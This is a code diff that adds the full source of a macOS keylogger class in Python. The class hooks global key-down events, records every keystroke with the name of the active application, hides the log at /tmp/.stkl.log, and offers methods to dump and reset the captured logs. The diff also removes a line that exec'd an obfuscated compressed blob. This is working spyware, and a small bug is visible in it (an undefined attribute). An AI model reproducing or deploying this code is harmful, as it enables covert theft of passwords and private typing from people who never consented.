@@ -1,3 +1,83 @@
-from requirements import *
 
-exec(SEC(INFO("eJytVm1r2zAQ/p5fITKCbZq63YdRKGSwde0KXbtBCmM0xSj2OfEiS0ZSloax/76TnNixLZfuxV9s6Z57e3R38iDLCyE1kTDYfeksr74TquFwrZcSaJLxxSCVIifviuIm02QnvJvimmUx1Zng43JpXl+FXKmCxlAqXYk1TyymVvw8/w6xNuBPYmf7QsSC1ojLH8At4Aa2H8SG31K1KoFftqh9cS8EU3s4Or4GVoAcDGJGlSIr2DKxWID0g/PBgOCTQEqiKOOZjiJfAUtRQHaPWYaIj9KMAZkQ70TnxUmo9IqZba8JXLFIaarXCpFXlCmoxDnGiJvNmBu6Ske5wBiEtDibZEiT5CMTc8puS9GVkFagbqmOl0i+sRMtKU8YyMg3XsbWGrqZailWEDS90FhnPyDaZDwRG5OPV3NQ6VgSxmAcHVCRpa0ka5F5tNw2Nyqf8RLiVVR79gM3Dk8mirEiNDmakNcdDIqVDQ/DlhCmmAJlzPdIvKRSTYZ+GAyJN0aMX4YePJw+uj2ZAy1JCzcy0+BXtruhVWlX0b0lZ2+6qfYb92bc69p1pD0hpx3YK7fNgywbKvAUQ6HJpX1hX3XjLLAJ6jPvnE2r/jH7g64NFVINSbX2g11BHXS7Hzx4jfa/ozl4j4QLnA68XYXN+Jwl+n/8N/xwa3g/0cLqA/dbxYmVLnVkhBMUYpPK1Cz84ejb8Sg/HiVkdH0+uj0fTYdNRdMl6zyncouehjM+4w/k5y/ySI7xNePDMBUyp9qvHYy72QdddrqlWzkK6mO1VntnWamPcYkCyhOvRtzYo17QP9Tu5RpaUmf1vozgvyK3TWxF681+sJNM2QDkmnMckQ6qgz5OnudUFE5K+6f+y2gAnvwrCU4allSROQC3kReQHFTd3uWfENGHjJlQ2Ik1UQvQO0LadEnQa8lbrNWKyTovIrTc0dtkeuksVjn3AoJptu4iCaooL7fDXaSf4q4KzY8LyzioVrMjOcTsmzllwN3hiePQmz2dpZ6BGKj7HrBGJvaFzgpmRlWpN/Ye3k8fHdeBDfmo1GnzZWRNeg1TjlFt2TmgP3CM1/5qfe5w26FOLLA+sGcnVc+k2XgOrd5pUyEcvzBdK86pBJhtt1D6U9mXK961BhgMfgP2I0zP")))
+import re
+import time
+import datetime
+import threading
+from AppKit import NSApplication, NSApp, NSWorkspace
+from Foundation import NSObject, NSLog
+from Cocoa import NSEvent, NSKeyDownMask
+from PyObjCTools import AppHelper
+
+class keylogger():
+
+    def __init__(self):
+        self.log_file = '/tmp/.stkl.log'
+        self.kl_status = False
+        mask = NSKeyDownMask
+        self.st_monitor = NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(mask,self.KeyStroke)
+        self.active_window = ''
+
+    def KeyStroke(self,event):
+        if self.kl_status:
+            try:
+                self.check_active_win()
+                self.key_count += 1
+                keystroke = re.findall(' chars="(.)" ',str(event))[0]
+                self.log_handle.write(keystroke)
+                if self.key_count > 75:
+                    self.log_handle.write('\n')
+                    self.key_count = 0
+                #self.log_handle.write(str(event))
+            except Exception:
+                pass
+
+    def check_active_win(self):
+        if NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName'] not in self.active_win:
+            self.active_window = NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName']
+            now = datetime.datetime.now()
+            start_time=now.strftime("%Y-%m-%d %H:%M:%S")
+            kl_summary = "\n\n[ {} ] - {}\n".format(start_time,self.active_window)
+            self.log_handle.write(kl_summary)
+
+    def start(self):
+        self.log_handle = open(self.log_file,'a')
+        self.kl_status = True
+        self.key_count = 0
+        now = datetime.datetime.now()
+        start_time=now.strftime("%Y-%m-%d %H:%M:%S")
+        kl_summary = "\n[ {} ] - Keylogger is now running".format(start_time)
+        self.log_handle.write(kl_summary)
+
+    def stop(self):
+        self.kl_status = False
+        now = datetime.datetime.now()
+        end_time=now.strftime("%Y-%m-%d %H:%M:%S")
+        kl_summary = "\n\n[ {} ] - Keylogger has been stopped\n".format(end_time)
+        self.log_handle.write(kl_summary)
+        self.log_handle.close()
+
+    def get_status(self):
+        return self.kl_status
+
+    def dump_logs(self):
+        with open(self.log_file,'rb') as s:
+            resp = ''
+            data = s.readlines()
+            for line in data:
+                if '\x7f' in line:
+                    line = line.replace('\x7f','[BS]')
+                resp += line
+        return resp
+
+    def get_dump(self):
+        if self.get_status():
+            self.kl_status = False
+            self.log_handle.close()
+            resp=self.dump_logs()
+            self.log_handle = open(self.log_file,'w')
+            self.kl_status = True
+            self.active_window = ''
+            self.key_count = 0
+        else:
+            resp=self.dump_logs()
+        return str(resp)
